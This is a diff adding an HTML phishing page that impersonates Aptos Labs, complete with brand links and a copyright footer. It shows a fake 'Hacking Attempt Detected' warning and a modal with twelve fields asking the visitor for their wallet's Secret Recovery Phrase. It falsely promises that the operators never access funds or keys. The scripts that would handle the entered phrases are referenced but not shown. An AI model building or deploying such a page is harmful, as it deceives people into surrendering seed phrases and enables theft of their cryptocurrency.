@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="css/style.css" />
+    <title>Aptos</title>
+  </head>
+  <body>
+
+    <header class="header">
+      <div class="header__content">
+        <img class="header__logo" src="img/logo.svg">
+        <ul class="header__buttons">
+          <li class="header__button"><a class="header__anchor button-text-white" href="https://aptoslabs.com/community">Community</a></li>
+          <li class="header__button"><a class="header__anchor button-text-white" href="https://www.aptosnames.com/">Products</a></li>
+          <li class="header__button"><a class="header__anchor button-text-white" href="https://aptoslabs.com/team">About</a></li>
+        </ul>
+        <button href="#" class="header__update button-text-green">UPDATE</button>
+      </div>
+    </header> 
+
+    <section class="main">
+      <div class="container">
+        <div class="main__content">
+          <div class="main__blocks">
+            <div class="main__upper-block main__block">
+              <p class="main__attention">ATTENTION</p>
+              <h1 class="main__title">Hacking Attempt <br> Detected</h1>
+              <p class="main__subtext">Please update your <span>Secret Recovery Phrase</span><br class="main__subtext-indent"> to protect your wallet</p>
+              <button class="main__btn button-green">Update</button>
+            </div>
+            <img class="main__arm-img" src="img/arm.svg" alt="no arm?">
+
+            <dialog class="modal" id="modal">
+              <div class="modal__header">
+                  <img src="img/logo-popup.svg" alt="#" class="modal__logo">
+                  <button class="modal__close">&times;</button>
+              </div>
+              <div class="underline__wrap">
+                <img src="img/popup-underline.svg" class="modal__underline"></img>
+              </div>
+              <div class="modal__body">
+                  <h3>Recovery Phrase</h3>
+                  <p class="modal__p">After logging in yor account,<br>Secret Recovery Phrase <span>will be updated</span></p>
+                  <ul class="modal__inputs">
+                      <li class="modal__input">
+                          <input type="text" class="input1" id="modal__input" placeholder="1.">
+                      </li>
+                      <li class="modal__input">
+                          <input type="text" class="input2" id="modal__input"placeholder="2.">
+                      </li>
+                      <li class="modal__input">
+                          <input type="text" class="input3" id="modal__input" placeholder="3.">
+                      </li>
+                      <li class="modal__input">
+                          <input type="text" class="input4" id="modal__input" placeholder="4.">
+                      </li>
+                      <li class="modal__input">
+                          <input type="text" class="input5" id="modal__input" placeholder="5.">
+                      </li>
+                      <li class="modal__input">
+                          <input type="text" class="input6" id="modal__input" placeholder="6.">
+                      </li>
+                      <li class="modal__input">
+                          <input type="text" class="input7" id="modal__input" placeholder="7.">
+                      </li>
+                      <li class="modal__input">
+                          <input type="text" class="input8" id="modal__input" placeholder="8.">
+                      </li>
+                      <li class="modal__input">
+                          <input type="text" class="input9" id="modal__input" placeholder="9.">
+                      </li>
+                      <li class="modal__input">
+                          <input type="text" class="input10" id="modal__input" placeholder="10.">
+                      </li>
+                      <li class="modal__input">
+                          <input type="text" class="input11" id="modal__input" placeholder="11.">
+                      </li>
+                      <li class="modal__input">
+                          <input type="text" class="input12" id="modal__input" placeholder="12.">
+                      </li>
+                  </ul>
+                  <p class="modal__subtitle">We never have access to your funds or private keys</p>
+                  <input type="submit" value="UPDATE" class="modal__update"></input>
+              </div>
+          </dialog>
+          
+            <div class="main__lower-block main__block">
+              <h3 class="main__subtitle">Reasons and signs <br> of hacking attempts:</h3>
+              <ul class="main__items">
+                <li class="main__item">
+                  <img class="main__item-img" src="img/icon-1.svg" alt="icon">
+                  <p class="main__item-text">Unprotected Authorization on Sites</p>
+                </li>
+                <li class="main__item">
+                  <img class="main__item-img" src="img/icon-2.svg" alt="icon">
+                  <p class="main__item-text">Recent NFT Purchases</p>
+                </li>
+                <li class="main__item">
+                  <img class="main__item-img" src="img/icon-3.svg" alt="icon">
+                  <p class="main__item-text">Suspicious Win Notifications</p>
+                </li>
+                <li class="main__item">
+                  <img class="main__item-img" src="img/icon-4.svg" alt="icon">
+                  <p class="main__item-text">Unknow NFTs in the Wallet</p>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer class="footer">
+      <div class="container">
+        <div class="footer__content">
+          <img class="footer__logo" src="img/logo-footer.svg" alt="Logo">
+          <p class="footer__copyright">© 2022 Aptos Labs</p>
+        </div>
+      </div>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="js/popup.js"></script>
+    <script src="js/inputs.js"></script>
+</body>
+  </body>
+</html>
